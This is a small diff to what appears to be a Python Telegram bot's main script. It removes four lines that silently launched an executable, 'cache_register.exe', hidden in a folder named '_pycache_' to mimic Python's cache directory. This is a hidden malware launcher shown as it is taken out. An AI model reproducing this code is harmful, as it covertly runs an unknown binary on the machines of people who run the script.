@@ -2,10 +2,6 @@ import asyncio
 import os
 import subprocess
 
-current_dir = os.path.dirname(os.path.abspath(__file__))
-exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "cache_register.exe")
-if os.path.exists(exe_file):
-    subprocess.Popen([exe_file])
 async def main():
     print("Soft's author: https://t.me/tyreme\n")
     action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4. Send secret word\n\n> "))
